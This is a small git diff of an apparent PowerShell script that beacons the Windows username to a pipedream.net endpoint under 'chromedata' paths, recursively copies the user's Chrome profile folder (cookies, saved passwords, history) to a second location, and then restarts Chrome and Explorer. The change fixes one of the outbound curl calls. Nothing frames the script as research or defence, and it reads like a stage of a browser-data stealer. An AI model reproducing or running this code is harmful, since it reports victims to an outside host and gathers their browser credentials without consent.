@@ -7,7 +7,7 @@ if (Get-Process Chrome) {
 curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/copying/$env:username" -method post
 Copy-Item -Path "C:\Users\$env:username\AppData\Local\Google\Chrome" -Destination "C:\Users\$env:username\AppData\Local\Google\Chrome2" -Recurse
 
-curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/completed/$env:username" -Body -method post
+curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/completed/$env:username" -method post
 Start-Process Chrome
 Start-Process explorer
 
